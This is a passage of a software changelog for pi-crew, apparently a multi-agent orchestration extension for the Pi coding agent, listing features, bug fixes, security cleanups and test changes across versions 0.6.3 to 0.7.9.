  existing test fixtures; treated as `[]` when omitted). `allAgents`
  merges them in priority order (project first, then project-pi so a
  `.pi/agents/foo.md` is a fallback to `.crew/agents/foo.md` within
  the project tier). `ResourceSource` extended with `"project-pi"`.

### F1 — frontmatter `tools:` wildcards
- New `BUILTIN_TOOL_NAMES` constant + `parseToolsField` helper in
  `agent-config.ts` (matching pi-subagents' `parseToolsField`):
  - omitted → `undefined` (back-compat: use the runtime default)
  - `*` or `all` (case-insensitive) → full `BUILTIN_TOOL_NAMES` list
  - `none` / `[]` / empty → `[]` (zero built-ins)
  - CSV → parsed entries (trimmed, empty dropped)
- `parseAgentFile` now uses `parseToolsField` instead of `parseCsv`,
  so existing agent files keep working with no edits. The
  `ext:<extension>/<tool>` selector from pi-subagents is a documented
  future gap (deferred — would require pi SDK introspection).

### F1 — frontmatter `excludeExtensions` denylist
- New `excludeExtensions?: string[]` field on `AgentConfig`, parsed
  from frontmatter `exclude_extensions: foo, bar`. Applied on the
  **child-pi path** in `pi-args.ts` as a case-insensitive basename
  denylist (an excluded extension is removed from the `--extension`
  list; the trusted `PROMPT_RUNTIME_EXTENSION_PATH` is never
  excludable). **Documented limitation**: the live-session path
  (opt-in via `runtime.preferLiveSession`) ignores it for v0.7.9 —
  pi's `DefaultResourceLoader` has no per-extension deny hook at the
  point we hand off. Users who need the denylist on live-session
  should stay on the child-pi runtime, or revisit when the SDK
  exposes the hook.

### Files
- `src/skills/discover-skills.ts` — F6 (5 roots, new source values)
- `src/runtime/skill-instructions.ts` — F6 (5 roots, type updates)
- `src/runtime/capability-inventory.ts` — F6 (CapabilitySource extended)
- `src/agents/agent-config.ts` — F1 (BUILTIN_TOOL_NAMES, parseToolsField,
  excludeExtensions field, ResourceSource +project-pi)
- `src/agents/discover-agents.ts` — F1 (projectPi tier, tools/excludeExtensions
  parsing, allAgents merge)
- `src/runtime/pi-args.ts` — F1 (excludeExtensions denylist applied to
  `--extension` args)
- `src/runtime/live-session-runtime.ts` — F1 (doc comment for the
  live-session limitation)
- `src/ui/agent-management-overlay.ts` — F1 (ResourceSource order includes
  project-pi)
- NEW `test/unit/v0-7-9-interop-granularity.test.ts` (15 tests)
- `test/unit/capability-inventory.test.ts` — accept expanded state set
  (shadowed/missing now possible from user-skill-roots shadowing bundles)
- `test/unit/discover-skills.test.ts` — accept expanded source set

typecheck clean; 4980+ tests pass / 0 fail. CI green on win/ubuntu/macos.

## [0.7.8] — F7 model-scope enforcement + cross-session leak fix (2026-06-16)

Two features/fixes from the same session: one new opt-in capability, one
correctness fix for a bug surfaced by the user while iterating on the new
feature (firing live in the session — a different Pi session's in-flight
run kept getting injected into the current session's context via the
ambient-status handler).

### Features

- **F7 model-scope enforcement** — opt-in gate that validates subagent model
  choices against the user's pi `enabledModels` allowlist. Trust distinction
  matches the pi-subagents reference semantics:
  - Caller-supplied (per-spawn `modelOverride` / `step.model` /
    `teamRoleModel`) out-of-scope → **hard error** (`CrewError E013
    ModelOutOfScope`) before spawn, fail-fast with actionable help hint.
  - Frontmatter-pinned (`AgentConfig.model`) out-of-scope → **warning +
    runs anyway** (frontmatter is authoritative; the agent author made a
    deliberate choice).
  Pattern semantics match pi's `--models` allowlist: exact
  (case-insensitive), glob with `*` (unanchored, so `"claude-*"` matches
  `anthropic/claude-opus-4-5`), and case-insensitive substring fallback.
  Toggle: `runtime.reliability.scopeModels: true` (default `false` = no
  enforcement, fully back-compat). The allowlist itself is read from
  pi's `SettingsManager.getEnabledModels()` per spawn (no caching, so
  changes take effect immediately). 20 new unit tests covering pattern
  matching, scope verdicts, and the routing gate (caller/frontmatter
  trust distinction + `isFrontmatterOverride` downgrade).

### Bug Fixes

- **Cross-session run-context leak** (commit `4bd6f5b`) — `collectInFlightRuns(cwd)`
  in `compaction-guard.ts` scanned the SHARED per-project `.crew/state/runs/`
  dir and filtered by STATUS only, ignoring `ownerSessionId`. Multiple Pi
  sessions in the same project share that directory, so Session B's
  compaction picked up Session A's in-flight runs and injected them into B's
  continuation prompt, making B wrongly try to resume A's run. The same
  leak affected ambient-status injection (`context-status-injection.ts`),
  showing A's runs in B's context stream. Fix: `collectInFlightRuns`
  gains optional `currentSessionId?` → strict filter
  `run.ownerSessionId === currentSessionId` (legacy ownerless runs
  excluded; true orphans are crash-recovery's job). New canonical
  `extractSessionId(ctx)` helper in `utils/session-utils.ts` (defensive
  against Proxy/exotic objects, replaces inline
  getOwnPropertyDescriptor in `register.ts`). Artifact index stays
  UNFILTERED (durable cross-session memory, not a resume directive).
  `triggerContinuation`'s `sendUserMessage` race ("Agent is already
  processing a prompt...") is detected and downgraded to silent — it is
  benign (the worker continues independently). 11 new regression tests
  (compaction-cross-session-leak.test.ts). CI green on all 3 platforms
  (run `27608398599`).

### Files

- NEW `src/runtime/model-scope.ts` — pattern matcher + verdict + SettingsManager
  reader.
- `src/runtime/model-fallback.ts` — `buildConfiguredModelRouting` gains
  `scopeModelsPatterns?` + `isFrontmatterOverride?` inputs; new
  `CrewError E013 ModelOutOfScope` factory in `src/errors.ts`.
- `src/config/types.ts` — new `reliability.scopeModels?: boolean` toggle
  (default `false`).
- `src/extension/team-tool/handle-settings.ts` — adds
  `reliability.scopeModels` to the visible-keys list so it surfaces in
  the settings overlay.
- `src/extension/registration/compaction-guard.ts`,
  `src/extension/context-status-injection.ts`,
  `src/extension/register.ts`, `src/utils/session-utils.ts` — leak fix.
- NEW `test/unit/model-scope.test.ts` (20 tests),
  `test/unit/compaction-cross-session-leak.test.ts` (11 tests).

typecheck clean; 4968+ tests pass / 0 fail.

## [0.7.7] — Windows spawn fix + plan-approval crash-recovery fix + CI flake fixes (2026-06-16)

A focused patch release driven by two community reports (Issue #33 and PR #32) plus the CI flake surfaced while validating them. CI green on Windows / Ubuntu / macOS (run 27599121797). 4965 tests pass / 0 fail.

### Bug Fixes

- **`#33` — Windows `spawn pi ENOENT`** (commit `afc23b4`): when pi is installed outside `%APPDATA%\npm` (nvm-windows / Volta / fnm put the global `node_modules` elsewhere), the static `%APPDATA%\npm` paths in `resolvePiCliScript()` all miss, and the fallback `spawn("pi")` fails with `ENOENT` because `child_process.spawn` does NOT do PATHEXT resolution on Windows (only `exec`/`execSync` via `cmd.exe` do). **Fix**: pi-crew now discovers the real npm global `node_modules` dir at runtime via `npm root -g` (run through `execSync`, which DOES resolve `npm.cmd` via PATHEXT), then derives the `@earendil-works` / `@mariozechner` package dirs from it and checks them BEFORE the static `%APPDATA%\npm` paths and the cwd fallback. Covers standard installs **and** nvm-windows / Volta / fnm uniformly. Memoized once per process (one-time ~200ms cost). Injection-safe — no `shell: true` on the real worker spawn. +6 tests.
- **Plan-approval-blocked runs crash-recovery fix** (commit `421b76d`, adapts PR #32 change #1 by @gustavo-pelissaro): crash recovery and stale reconciliation both treated `status === "blocked"` runs as repair candidates, so a run legitimately blocked on **human** plan approval (`requirePlanApproval`, `status="pending"`) was marked failed and/or orphan-cancelled when its owning session died or its async PID was no longer live — destroying an in-flight HITL checkpoint. **Fix**: new `isPlanApprovalPending(manifest)` guard (status=blocked AND `planApproval.required=true` AND `planApproval.status=pending`). Guarded in `reconcileStaleRun` (new `blocked_awaiting_approval` verdict, `repaired=false` — which automatically covers `reconcileAllStaleRuns`), `detectInterruptedRuns` (skip), `cancelOrphanedRuns` (push to `skipped`), and a belt-and-suspenders re-check under the lock in `reconcileAllStaleRuns`. The guard is intentionally narrow: a plain `blocked` run (no planApproval, or already approved/cancelled) is still a recovery candidate, so existing orphaned-blocked-run handling is unchanged. +6 tests.

### Tests (CI reliability)

- **`run-watcher-registry` macOS cancellation** (commit `dccb5e7`): the two fs.watch-dependent tests used unbounded `done()` callbacks that hung the whole test file on macOS CI runners (fs.watch events are slow/dropped under `/var/folders` + VM-runner FS load). Fixed with bounded async waits (1.5s deadline) consistent with production semantics, where fs.watch is best-effort and the preload poll loop is the source of truth.
- **`operator-experience` ubuntu redaction flake** (commit `2da1a1b`): the redaction test seeded a secret literally named `abc` and asserted `/abc/` does not leak, but the runId hash (`randomBytes(8).toString("hex")`) occasionally spells `...abc...` (e.g. `team_..._9791deabc2f52485`) → false failure, even though redaction worked perfectly. Fixed by switching to a `ZZ_LEAK_CANARY` marker — uppercase letters never appear in a lowercase-hex hash, so the marker is collision-proof.

### Community

- Thanks to **@YrFnS** for the textbook-quality Issue #33 report and diagnosis (PATHEXT, spawn vs execSync matrix) that pinpointed the fix.
- Thanks to **@gustavo-pelissaro** for PR #32 — change #1 (plan-approval preservation) landed here; changes #2/#3 (child exit-143 normalization, symlinked temp base) were closed for heavy conflicts but will be revisited.
- PR #34 (closed) overlapped the existing `%APPDATA%\npm` resolution; superseded by the runtime `npm root -g` probe.

## [0.7.6] — DX, observability, and a critical interactive-session hang fix (2026-06-16)

This release bundles Rounds 16–28: a developer-experience pass, an observability pass, and eight correctness/security audits — culminating in the **fix for the pts/2 interactive-session busy-loop hang** (two separate Pi sessions had hung at 71.5% CPU with 339 inotify watches). All 24 commits passed CI on Windows, Ubuntu, and macOS.

### 🚨 Critical — interactive-session hang (Round 28 + pts/2 investigation)

Report: `/home/bom/pts2-hang-investigation-2026-06-16.md`. Three root causes, all fixed:

- **BUG C (CRITICAL): recursive watcher busy-loop** — `watchCrewState` used `fs.watch(<crewRoot>/state, {recursive:true})`. On Linux, Node implements "recursive" as ONE inotify watch PER SUBDIRECTORY, so with many historical runs under `.crew/state/runs/` this ballooned to hundreds of watches (109→339 observed) and caused a permanent busy-loop even with no active work. **Fix**: new `src/utils/run-watcher-registry.ts` (`RunWatcherRegistry`) — one non-recursive watcher on the `runs/` root (for new-run detection, since `crew.run.created` is never emitted) + one non-recursive watcher per **active** run, reconciled each preload tick against `running`/`queued`/`planning` status. Total inotify cost is now O(active runs) — typically 1–5 — not O(total history). Completed runs leave the active set and their watcher closes within one tick. The dead `createRecursiveWatcher` / `watchCrewState` / `runIdFromStateRelativePath` primitives were deleted from `fs-watch.ts`.
- **BUG A (MEDIUM): health double-join path** — `HEALTH_DIR = ".crew/state/health"` was joined with a `crewRoot` computed only 2 `dirname`s up, writing to `.crew/state/.crew/state/health` — a path **no code ever reads**. It produced a growing ghost subtree that the recursive watcher then walked. **Fix**: `crewRoot` = 3 `dirname`s up; `HEALTH_DIR` = `"state/health"`.
- **BUG B (MEDIUM): OTLP CRLF injection** — header-value validation left CR (0x0D) and LF (0x0A) unblocked, enabling header-splitting / log-injection via crafted values. **Fix**: regex now `/[\x00-\x08\x0a-\x1f]/`.

Cleanup: 246 orphaned health snapshots (~1 MB) across 4 bogus `.crew/state/.crew/state/` subtrees were removed.

### Correctness audits (Rounds 22–27)

- **Round 27 — resource leaks**: (1) orphaned heartbeat timer in the team-runner catch block (`stopTeamHeartbeat()` never called on the error path; non-unref'd 30s interval kept the event loop alive → foreground pi hung); (2) FD leak in background-runner (`fs.openSync` without `closeSync`); (3) pipe FD leak + potential deadlock in async-runner (piped stdout/stderr never drained → >64 KB blocks forever); (4) AbortSignal listener leak in child-pi + live-session-runtime (anonymous `{once:true}` listeners never removed on normal completion).
- **Round 26 — cross-process file-locking** (5 bugs): TOCTOU split-read in `acquireLockWithRetry` (single-snapshot read closes the window); racy pre-acquisition target cleanup in `withFileLockSync` (removed); crash-between-mkdir-and-pidFile wedge (mtime-based stale check); PID-recycling wedge (mtime checked first for all holders); non-token-guarded release (PID-guarded removal).
- **Round 25 — security**: deleted two vulnerable dead modules — `sandbox.ts` (CRITICAL VM sandbox escape) and `dynamic-script-runner.ts` (HIGH `skip-validateScript`) — totalling −1701 LOC across 2 source + 5 test files. Plus closed verification-gate newline + `$VARNAME` injection (DANGEROUS_SHELL_PATTERNS extended).
- **Round 24 — event-log deadlock**: `appendEventInsideLock` (already inside `withEventLogLockSync`) called the public `compactEventLog`/`rotateEventLog` which re-acquired the same non-reentrant mkdir lock → 5 s timeout → compaction never ran → unbounded log growth → events silently dropped past 50 MB. Fix: extracted `prepareCompaction` / `applyCompactionUnlocked` / `rotateEventLogUnlocked` into `event-log-rotation.ts`.
- **Round 23 — UI correctness**: negative live duration in `agents-pane.ts` (shared `src/ui/live-duration.ts`); Unicode width/truncation bugs in `card-colors.ts`, `tool-renderers/index.ts`, `tool-render.ts`.
- **Round 22 — reliability**: checkpoint `.tmp.checkpoint` was reused across concurrent saves (cross-process data corruption → now unique per save); chain-parser had no recursion-depth limit (now `MAX_CHAIN_NESTING=100`).

### Developer experience (Round 16)

- **F1 "Did you mean?"** suggestions on unknown team actions.
- **F2 recovery hint** on all "Run not found" errors.
- **F3 compact status mode** (`details=false`) for low-noise polling.
- **F4 config errors surfaced** on the run path.
- **F5 pipeline dead-end redirect** — unsupported `action=pipeline` now points at a working workflow.
- **F6 troubleshooting guide** added at `docs/troubleshooting.md`; usage.md config path fixed.

### Observability (Round 17)

- **Progress % + ETA** in `status`; run age in the ambient context note.
- **Per-agent cost** in the dashboard + status output.
- **Aggregate failure patterns** in the run summary.

### Features

- **Round 21 (E4): `preStepOptional`** — advisory pre-step hooks that don't fail the run. Opt-in (`preStepOptional: true` on a `WorkflowStep`); fail-fast remains the default.
- **Round 18 (defense-in-depth)**: capped `suggestAction` input length.

### Tests

- +60+ tests across Rounds 16–28 (run-watcher-registry: 12, event-log deadlock: 5, injection guards: 6, file/event-log locks: 8, plus UI, DX, observability, and test-isolation coverage). 4955 pass / 0 fail. Test health pass restored the false-confidence security suite.

### Documentation

- Round 20 documentation-accuracy audit fixed 8 defects across README, CHANGELOG, and `docs/`.

## [0.7.5] — Ambient context status + perf hardening + error taxonomy (2026-06-15)

Three workstreams from the Round 11 API-gap and Round 15 perf/error audits: a new `context`-event feature, three performance fixes, and a full error-taxonomy expansion.

### Features

- **Ambient crew-status injection (GAP-2)** — registers Pi's `context` event handler so the parent agent stays continuously aware of in-flight crew runs on every LLM call, without calling the `team` tool. Injects a compact status note (runId/team/status/goal, capped at 3 inline) before the last message. **Transient and safe**: Pi uses the result only for that call (`agent-loop.ts:283-289`) — it never mutates persistent `state.messages`, so there's no accumulation or history corruption. No-op when zero runs are active. Toggle: `reliability.ambientStatusInjection`.

### Performance (Round 15 audit)

- **P1 (CRITICAL): throttle `persistSingleTaskUpdate` in `onJsonEvent`** — previously every child JSON event did a full locked read-parse-write of `tasks.json`; a 200-event task produced 200 such cycles. Now throttled to 500ms (in-memory progress stays fresh every event; final state force-flushed on completion).
- **P4: `buildWorkspaceTree` TTL cache (30s)** — workers in a run share a cwd, so the recursive walk was repeated once per task.
- **P5: `readKnowledge` mtime+size cache** — fired on every agent start (main + every worker), re-reading the same file N×/run.

### Error experience (Round 15 audit)

- **E1: extended CrewError taxonomy E007–E012** — the taxonomy previously covered only file I/O and discovery. The most common *runtime* failures (child timeout, model exhaustion, pre-step failure, event-log lock timeout, depth limit, stale run) now throw structured `CrewError`s with a machine-readable code, a default actionable help hint, and context. Wired into all six throw sites (`task-runner.ts`, `event-log.ts`, `pipeline-runner.ts`, `stale-reconciler.ts`).
- **E2: model fallback exhaustion surfaces the full chain tried** ("All N candidates exhausted (tried: a → b → c). Last failure: …") instead of only the last attempt's raw error.
- **E3: stale-reconcile error explains the heartbeat mechanism + remediation** instead of the bare "Stale run reconciled: <reason>".

### Tests

- +20 tests (context-status-injection: 11, errors E007–E012: 9). 4800+ pass / 0 fail.

### Research

This release was driven by the Round 11 Pi-API gap audit and the Round 15 performance/cost + error-experience audit, documented in `research-findings/`.

## [0.7.4] — Editor autocomplete + settings shortcut (2026-06-15)

Round 13 UX quick wins round-out: the remaining two Pi extension API integrations plus a hard-won CI reliability fix after the state-store test flake re-emerged on Windows and macOS.

### Features (UX)

- **Editor autocomplete provider** — registered via Pi's `addAutocompleteProvider`. As you type `crew <prefix>` or `team <prefix>` at the start of the input line, Pi's popup now suggests natural-language crew phrases and shows the slash command they map to (e.g. `crew status → /team-status`, `team dashboard → /team-dashboard`). `crew` and `team` are interchangeable keywords, driven by a single `CREW_PHRASES` source of truth shared with the input router.
- **Keyboard shortcut** — `alt+s` opens the pi-crew settings overlay (config + theme picker). `openTeamSettingsOverlay(ctx)` was extracted from the settings command handler so the shortcut reuses the exact same overlay (DRY). `alt+s` was chosen to avoid Pi's built-in keymap (Pi only binds `alt+v` and `alt+arrow`/`alt+enter` among alt+letter keys).

### Bug Fixes

- **createRunManifest swallowed the real write error** — `saveManifestAndTasksAtomicSync` returns `error: String(err)`, but `createRunManifest` passed it to `errors.fileWrite` as a fake `ErrnoException`; `.code` was `undefined` → every write failure showed `": unknown"`, hiding the actual cause. Now surfaces the real error string in the thrown context, so CI logs and production callers see *why* the write failed.
- **`atomicWriteFile` Windows path-form correctness** — must NEVER rewrite the write target to a different realpath form. Callers build `filePath` via `canonicalizePath` (`realpathSync.native`) and later stat/read it at that exact path; rewriting it (even to a "canonical" form) made the file land on a divergent path that Windows treated as separate → `existsSync`/`readFileSync` failed after a "successful" write. `canonicalize()` is now used ONLY as an mkdir fallback on Windows `EPERM`, never to change the write target.

### Tests / CI

- **Cap `--test-concurrency` at 2 on all CI platforms.** After the Round 13/14 test additions pushed every GitHub Actions runner past its filesystem-contention threshold, `state-store.test.ts` write-then-stat tests flaked on Windows (Windows Defender locks fresh temp files → rename `EPERM` exhausts atomic-write retries) and macOS (`/var/folders` tmp contention under load). `scripts/test-runner.mjs` now clamps the CI-requested concurrency (`4 → 2`) so the FS has room to flush; local dev is unaffected. Green on all 3 platforms (run 27556451997). 8× concurrent local runs reproduced nothing — pure CI infra contention, not a deterministic bug.
- +20 tests for the new features (crew-autocomplete: 16, crew-shortcuts: 4).

## [0.7.3] — Reliability hardening + UX quick wins (2026-06-15)

This release fixes 4 critical data-loss bugs found by the Round 12 reliability audit and adds three UX quick wins from the Round 13 UX research (+125 tests from the Round 14 coverage sprint).

### Bug Fixes (Critical — data loss prevention)

- **`rotateEventLog` destroyed ALL events** — `atomicWriteFile("")` then `rename` replaced the file with empty content *before* the rename, so the archive received an empty file. Now copies content to archive first, then truncates in place. Also handles sub-millisecond timestamp collisions.
- **`compactEventLog` recovery loop replaced the file per-event** — each `atomicWriteFile` iteration overwrote the compacted log + previous recoveries, leaving only the last event. Now accumulates missing events into one `appendFileSync`.
- **Mailbox `delivery.json` lost-update race** — `appendMailboxMessage`, `acknowledgeMailboxMessage`, and `replayPendingMailboxMessages` all had unlocked read-modify-write cycles. Now wrapped in `withFileLockSync`.
- **`observation-store.save()` non-atomic write** — raw `writeFileSync` could leave a truncated file on crash. Now uses `atomicWriteJson`.
- **`background-runner` DEBUG log noise** — 10 trace-level `console.log` statements gated behind `PI_CREW_DEBUG` env var.

### Features (UX)

- **Command argument autocomplete** — 13 run-scoped and team-scoped commands now implement `getArgumentCompletions` so Pi's built-in Tab-completion surfaces run IDs (with status icon + goal preview), team names, workflow names, and task IDs. No more memorizing long generated run IDs.
- **Custom message renderers** — `crew:run-started`, `crew:run-completed`, and `crew:resume-directive` entries now render with a clean crew-branded look (🚀/✅/❌ status icons, theme colors) instead of raw JSON blobs.
- **Natural-language crew routing** — type `crew status`, `team dashboard`, `crew help`, `teams`, etc. and pi-crew rewrites it to the equivalent slash command. Only transforms interactive input; never shadows explicit slash commands.

### Tests

- +125 tests (4795 pass / 0 fail). New coverage: cascading replace engine (31), safe-paths traversal defense (21), atomic-write symlink prevention (15), command completions (20), message renderers (12), input router (18), event-log rotate regression (9).

### Research

This release was driven by 4 deep research rounds (11–14), documented in `research-findings/`.

## [0.7.2] — Fix: Knowledge Injection into Workers + HITL for All Workflows (2026-06-15)

### Bug Fixes

- **Knowledge injection into crew workers (O4)** — crew workers are spawned with `--no-extensions` and only load `prompt-runtime.ts`; they do **not** load the pi-crew extension. So the `before_agent_start` hook in `knowledge-injection.ts` never fired for workers — `.crew/knowledge.md` was invisible to every crew worker. **Fix**: inject `buildKnowledgeFragment(task.cwd)` directly into `renderTaskPrompt()` in `prompt-builder.ts` (where all worker context is assembled). The main session still gets knowledge via the hook; workers now get it via the prompt path.

  **Live-verified**: all 3 workers (explorer, executor, verifier) in a fast-fix run confirmed seeing the knowledge section verbatim (`"Use TABS for indentation"`, `"Tests run via npm test"`).

- **Plan-level HITL for all workflows (T1.2)** — the post-batch approval re-check in the team-runner main loop only checked `hasPendingMutatingAdaptiveTask(tasks)` (adaptive/implementation workflows only). The boundary detector `hasPendingMutatingTaskAtBoundary(tasks)` was added to the initial build but **not** to the loop's re-check. So for non-adaptive workflows (`default`, `fast-fix`), the approval gate never fired after read-only tasks completed. **Fix**: add `hasPendingMutatingTaskAtBoundary(tasks)` to the loop's post-batch re-check (line 835), matching the initial-build logic.

  **Verified** via 6 new unit tests + full flow trace. When `runtime.requirePlanApproval: true`, the run now blocks at the plan→execute boundary (`status: blocked`, "Plan approval required") until approved via `team api op=approve-plan`.

## [0.7.1] — Fix: Auto-Continue After Compaction (2026-06-15)

### Bug Fix

- **`a??`** — **Compaction resilience actually works now.** The v0.7.0 fix (O10) only *appended a resume-directive entry* after compaction, but appending an entry does **not trigger an agent turn** — the session still waited for user input, so the user still had to type "continue". The real root cause: Pi's threshold auto-compaction (`_runAutoCompaction` reason=`threshold` willRetry=`false`) returns `this.agent.hasQueuedMessages()`, which is `false` when nothing is queued → the agent loop ends → Pi waits for input (documented: "NO auto-retry, user continues manually").

  **Fix**: after `session_compact` fires, call `pi.sendUserMessage(continuationPrompt)`. Per Pi's API, `sendUserMessage` *always triggers a turn*. The agent automatically runs a new turn, sees the resume directive, calls `team status`, and continues the in-flight crew task — **zero manual intervention**.

  - `buildContinuationPrompt()`: action-oriented prompt ("Context was compacted while crew tasks were in-flight. Continue the work — do not wait for me.")
  - `triggerContinuation(pi, ctx, runs)`: fire-and-forget `sendUserMessage`, best-effort error handling
  - Wired in both the reactive path (`session_compact` handler) and proactive path (`startCompact.onComplete`)
  - Only fires when in-flight crew runs exist; non-crew compaction unaffected
  - 6 new unit tests

## [0.7.0] — Long-Term Roadmap: Compaction Resilience, Cost Visibility, Trust Trinity (2026-06-15)

This release implements Phase 0 + Phase 1 of the pi-crew long-term roadmap (a 10-round research synthesis), plus the single-agent cliff hedge. The organizing principle: **build trust and cliff-resilience, stay lean, delete before adding.**

### Highlights

- **🛡️ Compaction resilience (O10)** — the #1 user pain ("after auto-compact, the task stops midway") is fixed. pi-crew now detects in-flight runs, injects an explicit resume directive into the compaction summary, and re-attaches after compaction. Tasks survive context compaction.
- **💰 Cost visibility (O1)** — `team summary <runId>` now shows a full cost report with per-role attribution and token breakdown. Multi-agent's #1 barrier is cost; now it's visible.
- **✋ Plan-level HITL for any workflow (O5)** — plan approval was locked to the `implementation` workflow; now any workflow honors `config.runtime.requirePlanApproval`, gating at the read-only→mutating (plan→execute) boundary.
- **🧠 Cross-run memory (O4)** — `.crew/knowledge.md` is auto-read and injected into every agent's system prompt. pi-crew "gets better the longer you use it." Radically downsized (~80 LOC) replacement for the deleted MemoryStore.
- **🎯 Single-agent cliff hedge (T0.5/T2.2)** — any workflow can be composed into a single sequential prompt (`team plan singleAgent=true`). Proves pi-crew's mission survives even if multi-agent is obsoleted by 1M+ token models.
- **🧹 2,335 LOC of dead code removed** — grep-verified unused BudgetTracker, MemoryStore, `.bak` files, disabled brief-mode.
- **🔌 Pi-api seam** — centralizes the 8-symbol Pi coupling surface in one file, hedging against Pi API churn.

### Features (Phase 0 — Stabilize & Clean)

- **`dbb4b6c`** — Deleted `budget-tracker.ts` (353 LOC), `memory-store.ts` (244 LOC), `brief-tool-overrides.ts` (400 LOC, disabled since 0.6.4), 3× `.bak` files (1,338 LOC), and their tests. Net −2,918 LOC including tests.
- **`42c1442`** — **Compaction resilience (O10)**: `compaction-guard.ts` gained `collectInFlightRuns()`, `formatResumeDirective()`, and a new `session_compact` handler that re-injects a `crew:resume-directive` entry into the fresh post-compaction context + notifies the user. Covers both the proactive path and Pi's reactive auto-compact path.
- **`40caf9e`** — `src/extension/pi-api.ts`: a type-level seam re-exporting the 8 public-API symbols pi-crew uses (ExtensionAPI, ExtensionContext, ExtensionCommandContext, ToolDefinition, defineTool, createBashTool, AgentSessionEvent, BeforeAgentStartEvent) + `BUILT_AGAINST_PI_VERSION` constant for version-drift diagnostics.
- **`8f40b07`** — **Single-agent cliff hedge v0**: `single-agent-compose.ts` (~95 LOC). `orderSteps()` topologically sorts by dependsOn; `composeSingleAgentPrompt()` turns a workflow into one sequential execution prompt.

### Features (Phase 1 — Trust Trinity)

- **`3184303`** — **Cost visibility (O1)**: `state/usage.ts` gained `formatTokens()`, `formatCost()`, `aggregateUsageByRole()`, and `formatCostReport()`. The `summary` action now includes a multi-line report with token split + per-role % breakdown.
- **`198994e`** — **Plan-level HITL (O5)**: `team-runner.ts` `requiresPlanApproval()` dropped the `workflow.name === "implementation"` constraint; `hasPendingMutatingTaskAtBoundary()` (new) gates at the plan→execute boundary for any workflow; `ensurePlanApprovalRequested()` is robust to a missing `assess` step and gives clearer approval guidance.
- **`0272d77`** — **Cross-run memory (O4)**: `knowledge-injection.ts` (~80 LOC) registers a `before_agent_start` hook that appends `.crew/knowledge.md` (truncated to 16KB) to every agent's system prompt — main session + each crew worker.

### Features (Phase 2 — Lean Power)

- **`eeefe0a`** — **Single-agent runtime mode (T2.2)**: `singleAgent` boolean param on the `team plan` action. A Pi agent calling `team plan singleAgent=true` receives the full composed sequential prompt for any workflow. MCP tool consumption (T2.1) already existed for live-session workers (`mcp-proxy.ts`); verified and left in place rather than duplicated.

### Upgrade Notes
- New config: `runtime.requirePlanApproval = true` enables plan-level approval gates on any workflow.
- New file: `.crew/knowledge.md` (optional) — write durable project knowledge; it's injected into every run.
- Cost report appears automatically in `team summary`. Budget *enforcement* (auto-stop) is intentionally deferred until cost-data accuracy is validated.

## [0.6.4] — Visually Rich Tool Rendering: Merged Frames, Live Progress Bars (2026-06-14)

### Highlights
- **Visually rich team & agent tool rendering** — framed cards with box-drawing borders, colored status badges, and structured layouts for `team` and `Agent` tool calls in the Pi TUI
- **Merged call+result into ONE connected frame** — previously `renderCall` and `renderResult` each drew a complete box, producing two disconnected frames. Now they split a single frame (top border + header from `renderCall`, content + bottom border from `renderResult`) that merge seamlessly in Pi's `Box(1,1)` container
- **Animated live progress bar during runs** — real-time task progress (`tasks completed=N/M`) parsed from streaming updates and rendered as a `████░░░░ N/M` bar with elapsed time, DURING the run (not after completion). Indeterminate "starting" phase uses an animated scanning bar
- **Compact summary after completion** — collapsed cards show `✓ crew run  3/3 done · 1m2s · 26k tok · $0.068` with expand hint (`⌘E`) and agent briefs (`✓ explorer · 45.0s · 8.0k tok`)
- **Crash fix on session resume** — `renderCall` was returning a `string` (from `buildFrame`), causing `TypeError: child.render is not a function` when Pi re-rendered stored tool calls on resume. Now wraps in `new Text(...)`

### Bug Fixes
- **`5613ecc`** — **Critical crash fix**: `teamToolRenderer.renderCall` and `agentToolRenderer.renderCall` returned `buildFrame(...)` (a string), not a Component. Pi's `addChild(string)` stored the string in `children[]`, then `Box.render()` called `child.render(width)` on the string → crash. Only surfaced on resume because fast-completing tools got their `Text` result frame painted before the string call frame was rendered. Fixed by wrapping both renderers in `new Text(..., 0, 0)`.
- **`58ba6e5`** — Elapsed time miscalculation: Pi's `ctx.executionStarted` is a **boolean** flag (not a timestamp), so `Date.now() - true` produced ~56-year durations. Now timing is tracked via `ctx.state.briefStartedAt`.
- **`1c2cf71`** — Reverted `lastComponent` reuse: returning `ctx.lastComponent` and mutating its private `.text` field crashed on session resume (deserialized components lose prototype methods). Pi already calls `renderContainer.clear()` before each `updateDisplay()`, so single-frame streaming is guaranteed without reuse.
- **`7d01ebb`** — Typecheck fix: `agentToolRenderer.renderCall` had parameter named `_ctx` (unused convention) but `borderFromContext(ctx)` referenced `ctx` (`error TS2552`).

### Reverts
- **`0763e67`** — **Disabled brief tool overrides**. Re-registering built-in tools (read/bash/edit/write/find/grep/ls) replaced Pi's superior native renderers (syntax highlighting, diff views, full file content) with inferior custom `fullRender()` output, and caused `renderCall`/`renderResult` to duplicate path/command info. The file is retained for reference; re-enable by uncommenting one line in `register.ts`.

### Test Fixes
- **`39d1dc7`** — `AnimatedMascot` timing tests were flaky under CI load. The animation advances via `setInterval(20ms)` which is `unref()`'d; under `--test-concurrency=4` the unref'd timers get delayed, so a fixed 70ms wait wasn't always enough for one tick. Replaced fixed waits with polling loops (retry until the frame advances, up to 600ms). Applied to both cat and armin animation tests. Robust: finishes fast normally (~40ms), tolerates heavy load.

### Features (UI)
- **`a7b703b`** — `parseStreamingProgress()` parses `tasks completed=N running=M` and `N/M done` formats from streaming progress text; `renderScanBar()` renders an animated bouncing bar for the indeterminate "starting" phase.
- **`9b1de38`** — `onRunStarted` now called in the async path of `run.ts` (was only in foreground path), so background runs attach the progress binder and show real-time progress instead of stuck "starting".
- **`5741d73`** — `formatCompactToolProgress` always includes the `tasks N/M done status=X` line even when an active agent is present (was skipped via `else if` bug).
- **`22d8132`** — `extractContentText` returns only the LAST text block (was `.join("\n")` on all blocks, causing stacked progress frames during streaming).
- **`3777fbc`** — `buildFrameTop()` / `buildFrameBottom()` split rendering so `renderCall` + `renderResult` merge into one connected frame; `borderFromContext(ctx)` keeps top and bottom border colors consistent (accent while running, green on success, red on error).
- **`9fa5153`** — Cost display in collapsed cards (`computeTotalCost()`), `⌘E` expand hint, agent briefs with duration/tokens, `shortenPath()` (`$HOME` → `~`), OSC 8 clickable paths (`linkPath()`).
- **`f9c9803`** — Frame width auto-adjusts to terminal via `process.stdout.columns`.

### Stats
- 9 commits since v0.6.3
- CI green on Ubuntu, macOS, and Windows

## [0.6.3] — Cross-Platform CI, 87 Test Fixes, Worktree Validation, Heartbeat & Crash Fixes (2026-06-12)

### Highlights
